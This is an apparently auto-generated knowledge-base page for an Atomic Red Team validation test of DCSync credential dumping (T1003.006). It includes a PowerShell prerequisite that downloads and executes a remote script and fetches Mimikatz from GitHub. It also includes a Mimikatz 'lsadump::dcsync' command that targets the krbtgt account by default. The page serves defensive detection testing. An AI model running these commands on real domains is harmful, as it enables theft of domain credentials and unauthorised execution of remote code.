---
atomic_guid: "129efd28-8497-4c87-a1b0-73b9a870ca3e"
title: "DCSync (Active Directory)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.006"
attack_technique_name: "OS Credential Dumping: DCSync"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "129efd28-8497-4c87-a1b0-73b9a870ca3e"
  - "DCSync (Active Directory)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
Works against a remote Windows Domain Controller using the replication protocol.
Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
[Reference](https://adsecurity.org/?p=1729)

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003006-dcsync|T1003.006: DCSync]]

## Input Arguments

### domain

- description: Targeted Active Directory domain
- type: string
- default: %userdnsdomain%

### mimikatz_path

- description: Mimikatz windows executable
- type: path
- default: %tmp%\mimikatz\x64\mimikatz.exe

### user

- description: Targeted user
- type: string
- default: krbtgt

## Dependencies

Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Prerequisite Check

```powershell
$mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1" -UseBasicParsing) 
$releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases"
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(".zip") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl "x64/mimikatz.exe" $basePath
```

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
#{mimikatz_path} "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}" "exit"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.yaml)
